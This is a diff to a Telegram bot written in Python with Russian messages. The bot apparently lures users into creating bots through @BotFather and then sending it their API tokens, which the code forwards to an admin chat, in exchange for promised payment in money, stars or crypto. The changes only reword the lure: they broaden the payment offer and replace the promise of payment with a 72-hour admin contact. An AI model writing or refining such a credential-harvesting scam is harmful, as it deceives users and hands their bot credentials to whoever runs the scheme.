@@ -30,27 +30,27 @@ main_kb = ReplyKeyboardMarkup(
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     await message.answer(
-        "👋 Привет! Здесь ты можешь сдать бота за вознаграждение.\n"
-        "Нажми кнопку ниже, и я сгенерирую данные для создания.",
+        "👋 Привет! Здесь ты можешь сдать бота за деньги / звёзды / крипту.\n"
+        "Нажми кнопку ниже, и я подберу задание для тебя.",
         reply_markup=main_kb
     )
 
-@dp.message(F.text == "Начать процесс ⚙️")
+@dp.message(F.text == "Подобрать задание ⚙️")
 async def step_1(message: types.Message):
     name = random.choice(NAMES)
-    await message.answer("1️⃣ **Шаг первый:**\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду `/newbot`.")
+    await message.answer("1️⃣ Шаг первый:\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду /newbot.")
     await asyncio.sleep(1) # Небольшая пауза для реалистичности
     await message.answer("Теперь перешлите сообщение ниже (название бота) туда:")
     await message.answer(f"`{name}`", parse_mode="MarkdownV2")
     
     # Генерируем юзернейм для следующего шага
     username = gen_username()
-    await message.answer("2️⃣ **Шаг второй:**\nКогда он попросит юзернейм, перешлите ему это сообщение:")
+    await message.answer("2️⃣ Шаг второй:\nКогда он попросит юзернейм, перешлите ему это сообщение:")
     await message.answer(f"`{username}`", parse_mode="MarkdownV2")
     
     await message.answer(
-        "3️⃣ **Шаг третий:**\nПосле этого @BotFather пришлет вам длинный API токен (пример: 123456789:ABCD12EFg3u4EFGH5agndODnxy6vJk789ia.\n\n"
-        "**Скопируйте его и пришлите мне прямо сюда!**"
+        "3️⃣ Шаг третий:\nПосле этого @BotFather пришлет вам длинный API токен (пример: 123456789:ABCD12EFg3u4EFGH5agndODnxy6vJk789ia.\n\n"
+        "Скопируйте его и пришлите мне прямо сюда!"
     )
 
 @dp.message()
@@ -66,7 +66,7 @@ async def handle_token(message: types.Message):
         )
         try:
             await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
-            await message.answer("✅ Токен успешно получен и отправлен на проверку! Спасибо, ожидайте выплаты.")
+            await message.answer("✅ Токен успешно получен и отправлен на проверку! В течении 72 часов с вами свяжется администратор.")
         except Exception as e:
             await message.answer("❌ Ошибка при передаче данных. Свяжитесь с админом.")
             print(f"Ошибка: {e}")
